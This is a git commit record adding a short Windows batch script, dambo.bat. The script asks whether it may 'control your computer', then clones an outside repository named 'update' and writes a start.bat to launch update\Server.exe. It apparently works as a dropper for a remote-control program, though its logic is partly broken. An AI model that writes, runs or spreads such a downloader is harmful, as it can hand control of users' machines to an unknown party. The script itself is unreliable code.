d049a047909a5ccec9a9830f0f989a3092d4b817
Dambo389 <150391167+Dambo389@users.noreply.github.com>
2024-03-10 08:28:58 +0200

    Add files via upload

---
+++ Cat/dambo.bat
@@ -0,0 +1,11 @@
+@echo off
+cls
+ for /l %%i in (0,1,2) do (
+  set /p v="can I control your computer, if yes then press any key and enter, if not then close: "
+  if "%v%"=="Yes" (
+    echo RIGHT
+  ) else (
+    git clone https://github.com/Dambo389/update.git
+@echo start update\Server.exe>start.bat
+ )
+)
